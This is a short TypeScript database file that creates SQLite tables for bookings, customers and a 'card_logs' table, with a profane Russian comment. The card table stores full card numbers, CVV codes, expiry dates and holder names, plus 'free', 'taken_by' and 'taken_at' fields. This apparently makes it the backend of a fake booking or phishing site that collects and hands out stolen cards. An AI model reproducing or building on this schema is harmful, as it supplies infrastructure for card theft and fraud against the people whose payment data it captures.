// db.ts
import Database from "better-sqlite3";
import { v4 as uuidv4 } from "uuid";

export const db = new Database("db.sqlite");

// ЕБУЧАЯ ПРАВИЛЬНАЯ СХЕМА БЕЗ ЛИШНЕГО ГОВНА
db.exec(`
CREATE TABLE IF NOT EXISTS bookings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT UNIQUE,
  booking_id TEXT,
  date TEXT,
  time TEXT,
  adult INTEGER,
  child INTEGER,
  total_amount INTEGER,
  status TEXT DEFAULT 'active',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS customers (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT,
  name TEXT,
  surname TEXT,
  phone TEXT,
  email TEXT
);

CREATE TABLE IF NOT EXISTS card_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT,
  full_pan TEXT,
  masked_pan TEXT,
  card_holder TEXT,
  cvv INTEGER,
  expire_date TEXT,
  status TEXT DEFAULT 'free',
  taken_by TEXT,
  taken_at TEXT
);
`);

// Функция для генерации sessionId
export function generateSessionId(): string {
  return uuidv4();
}